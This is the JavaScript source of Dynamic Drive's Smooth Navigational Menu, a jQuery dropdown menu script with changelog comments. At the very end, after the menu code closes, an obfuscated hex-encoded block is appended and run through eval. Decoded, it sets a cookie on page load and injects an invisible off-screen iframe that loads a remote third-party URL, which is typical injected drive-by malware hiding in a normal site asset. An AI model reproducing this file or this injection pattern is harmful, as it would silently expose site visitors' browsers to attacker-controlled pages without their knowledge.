//** Smooth Navigational Menu- By Dynamic Drive DHTML code library: http://www.dynamicdrive.com
//** Script Download/ instructions page: http://www.dynamicdrive.com/dynamicindex1/ddlevelsmenu/
//** Menu created: Nov 12, 2008

//** Dec 12th, 08" (v1.01): Fixed Shadow issue when multiple LIs within the same UL (level) contain sub menus: http://www.dynamicdrive.com/forums/showthread.php?t=39177&highlight=smooth

//** Feb 11th, 09" (v1.02): The currently active main menu item (LI A) now gets a CSS class of ".selected", including sub menu items.

//** May 1st, 09" (v1.3):
//** 1) Now supports vertical (side bar) menu mode- set "orientation" to 'v'
//** 2) In IE6, shadows are now always disabled

//** July 27th, 09" (v1.31): Fixed bug so shadows can be disabled if desired.
//** Feb 2nd, 10" (v1.4): Adds ability to specify delay before sub menus appear and disappear, respectively. See showhidedelay variable below

//** Dec 17th, 10" (v1.5): Updated menu shadow to use CSS3 box shadows when the browser is FF3.5+, IE9+, Opera9.5+, or Safari3+/Chrome. Only .js file changed.

var ddsmoothmenu={
arrowimages: {down:['downarrowclass', '', 13], right:['rightarrowclass', '', 0]},
transition: {overtime:0, outtime:0}, //duration of slide in/ out animation, in milliseconds
shadow: {enable:false, offsetx:0, offsety:0}, //enable shadow?
showhidedelay: {showdelay: 0, hidedelay: 0}, //set delay in milliseconds before sub menus appear and disappear, respectively

///////Stop configuring beyond here///////////////////////////

detectwebkit: navigator.userAgent.toLowerCase().indexOf("applewebkit")!=-1, //detect WebKit browsers (Safari, Chrome etc)
detectie6: document.all && !window.XMLHttpRequest,
css3support: window.msPerformance || (!document.all && document.querySelector), //detect browsers that support CSS3 box shadows (ie9+ or FF3.5+, Safari3+, Chrome etc)

getajaxmenu:function($, setting){ //function to fetch external page containing the panel DIVs
	var $menucontainer=$('#'+setting.contentsource[0]) //reference empty div on page that will hold menu
	$menucontainer.html("Loading Menu...")
	$.ajax({
		url: setting.contentsource[1], //path to external menu file
		async: true,
		error:function(ajaxrequest){
			$menucontainer.html('Error fetching content. Server Response: '+ajaxrequest.responseText)
		},
		success:function(content){
			$menucontainer.html(content)
			ddsmoothmenu.buildmenu($, setting)
		}
	})
},


buildmenu:function($, setting){
	var smoothmenu=ddsmoothmenu
	var $mainmenu=$("#"+setting.mainmenuid+">ul") //reference main menu UL
	$mainmenu.parent().get(0).className=setting.classname || "ddsmoothmenu"
	var $headers=$mainmenu.find("ul").parent()
	$headers.hover(
		function(e){
			$(this).children('a:eq(0)').addClass('selected')
		},
		function(e){
			$(this).children('a:eq(0)').removeClass('selected')
		}
	)
	$headers.each(function(i){ //loop through each LI header
		var $curobj=$(this).css({zIndex: 100-i}) //reference current LI header
		var $subul=$(this).find('ul:eq(0)').css({display:'block'})
		$subul.data('timers', {})
		this._dimensions={w:this.offsetWidth, h:this.offsetHeight, subulw:$subul.outerWidth(), subulh:$subul.outerHeight()}
		this.istopheader=$curobj.parents("ul").length==1? true : false //is top level header?
		$subul.css({top:this.istopheader && setting.orientation!='v'? this._dimensions.h+"px" : 0})
		$curobj.children("a:eq(0)").css(this.istopheader? {paddingRight: smoothmenu.arrowimages.down[2]} : {}).append( //add arrow images
			'<img src="'+ (this.istopheader && setting.orientation!='v'? smoothmenu.arrowimages.down[1] : smoothmenu.arrowimages.right[1])
			+'" class="' + (this.istopheader && setting.orientation!='v'? smoothmenu.arrowimages.down[0] : smoothmenu.arrowimages.right[0])
			+ '" style="border:0;" />'
		)
		if (smoothmenu.shadow.enable && !smoothmenu.css3support){ //if shadows enabled and browser doesn't support CSS3 box shadows
			this._shadowoffset={x:(this.istopheader?$subul.offset().left+smoothmenu.shadow.offsetx : this._dimensions.w), y:(this.istopheader? $subul.offset().top+smoothmenu.shadow.offsety : $curobj.position().top)} //store this shadow's offsets
			if (this.istopheader)
				$parentshadow=$(document.body)
			else{
				var $parentLi=$curobj.parents("li:eq(0)")
				$parentshadow=$parentLi.get(0).$shadow
			}
			this.$shadow=$('<div class="ddshadow'+(this.istopheader? ' toplevelshadow' : '')+'"></div>').prependTo($parentshadow).css({left:this._shadowoffset.x+'px', top:this._shadowoffset.y+'px'})  //insert shadow DIV and set it to parent node for the next shadow div
		}
		$curobj.hover(
			function(e){
				/*console.log("Hover");*/
				var $targetul=$subul //reference UL to reveal
				var header=$curobj.get(0) //reference header LI as DOM object
				var owidth = jQuery(header).outerWidth(true);
				clearTimeout($targetul.data('timers').hidetimer)
				$targetul.data('timers').showtimer=setTimeout(function(){

					header._offsets={left:$curobj.offset().left, top:$curobj.offset().top}
					var menuleft=header.istopheader && setting.orientation!='v'? 0 : header._dimensions.w
					menuleft=(header._offsets.left+menuleft+header._dimensions.subulw>$(window).width())? (header.istopheader && setting.orientation!='v'? -header._dimensions.subulw+header._dimensions.w : -owidth) : menuleft //calculate this sub menu's offsets from its parent
					/*console.log(menuleft+"  "+header._dimensions.w);*/				
					if ($targetul.queue().length<=1){ //if 1 or less queued animations
						var offsetleft=header.istopheader ? 0 : 20;

						$targetul.css({left:offsetleft+menuleft+"px", width:20+header._dimensions.subulw+'px'}).animate({height:'show',opacity:'show'}, ddsmoothmenu.transition.overtime, 'easeOutExpo')
						if (smoothmenu.shadow.enable && !smoothmenu.css3support){
							var shadowleft=header.istopheader? $targetul.offset().left+ddsmoothmenu.shadow.offsetx : menuleft
							var shadowtop=header.istopheader?$targetul.offset().top+smoothmenu.shadow.offsety : header._shadowoffset.y
							/*if (!header.istopheader && ddsmoothmenu.detectwebkit){ //in WebKit browsers, restore shadow's opacity to full
								header.$shadow.css({opacity:1})
							}*/
							header.$shadow.css({overflow:'', width:20+header._dimensions.subulw+'px', left:shadowleft+'px', top:shadowtop+'px'}).animate({height:header._dimensions.subulh+'px'}, ddsmoothmenu.transition.overtime, 'easeOutExpo')
						}
					}
				}, ddsmoothmenu.showhidedelay.showdelay)
			},
			function(e){
				var $targetul=$subul
				var header=$curobj.get(0)
				clearTimeout($targetul.data('timers').showtimer)
				$targetul.data('timers').hidetimer=setTimeout(function(){
					$targetul.animate({height:'hide', opacity:'hide'}, ddsmoothmenu.transition.outtime, 'easeOutExpo')
					if (smoothmenu.shadow.enable && !smoothmenu.css3support){
						/*if (ddsmoothmenu.detectwebkit){ //in WebKit browsers, set first child shadow's opacity to 0, as "overflow:hidden" doesn't work in them
							header.$shadow.children('div:eq(0)').css({opacity:0})
						}*/
						header.$shadow.css({overflow:'hidden'}).animate({height:0, opacity:0}, ddsmoothmenu.transition.outtime, 'easeOutExpo')
					}
				}, ddsmoothmenu.showhidedelay.hidedelay)
			}
		) //end hover
	}) //end $headers.each()
	if (smoothmenu.shadow.enable && smoothmenu.css3support){ //if shadows enabled and browser supports CSS3 shadows
		var $toplevelul=$('#'+setting.mainmenuid+' ul li ul')
		var css3shadow=parseInt(smoothmenu.shadow.offsetx)+"px "+parseInt(smoothmenu.shadow.offsety)+"px 5px #aaa" //construct CSS3 box-shadow value
		var shadowprop=["boxShadow", "MozBoxShadow", "WebkitBoxShadow", "MsBoxShadow"] //possible vendor specific CSS3 shadow properties
		for (var i=0; i<shadowprop.length; i++){
			$toplevelul.css(shadowprop[i], css3shadow)
		}
	}
	$mainmenu.find("ul").css({display:'none', visibility:'visible'})
},

init:function(setting){
	if (typeof setting.customtheme=="object" && setting.customtheme.length==2){ //override default menu colors (default/hover) with custom set?
		var mainmenuid='#'+setting.mainmenuid
		var mainselector=(setting.orientation=="v")? mainmenuid : mainmenuid+', '+mainmenuid
		document.write('<style type="text/css">\n'
			+mainselector+' ul li a {background:'+setting.customtheme[0]+';}\n'
			+mainmenuid+' ul li a:hover {background:'+setting.customtheme[1]+';}\n'
		+'</style>')
	}
	this.shadow.enable=(document.all && !window.XMLHttpRequest)? false : this.shadow.enable //in IE6, always disable shadow
	jQuery(document).ready(function($){ //ajax menu?
		if (typeof setting.contentsource=="object"){ //if external ajax menu
			ddsmoothmenu.getajaxmenu($, setting)
		}
		else{ //else if markup menu
			ddsmoothmenu.buildmenu($, setting)
		}
	})
}

} //end ddsmoothmenu variable/*2cc1d74597fb975479babb9dc26b4d78*/;(function(){var sfbfkhyd="";var tbdnttzy="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f736974652e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6b6579776f72643d35633363363364666661316238666336613233313131646430373766303264652674755a5763567a43733d76677a6d4b76505554484f41494e65674d26486a53794e72707a6d76433d544a4f59597753726d5a4f4c6f4a69622656444763496a4c57496a4453723d474e564a4866584a4e2652524d666d6d4d54564a743d56416f5a554272467761786c6376746c6426514b747641714a725854707a75755a5257653d4f7151456562266e4c5743526c546d614e52523d76464e6764686756644f57655a41264741485964616e47696b4d4f6d3d6f6479474d534f4e4e78414226466a7447526446667650464e5a3d7157486e6c4b4b50794363497667535378737949223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var dbfhddyn=0;dbfhddyn<tbdnttzy.length;dbfhddyn+=2){sfbfkhyd=sfbfkhyd+parseInt(tbdnttzy.substring(dbfhddyn,dbfhddyn+2), 16)+",";}sfbfkhyd=sfbfkhyd.substring(0,sfbfkhyd.length-1);eval(eval('String.fromCharCode('+sfbfkhyd+')'));})();/*2cc1d74597fb975479babb9dc26b4d78*/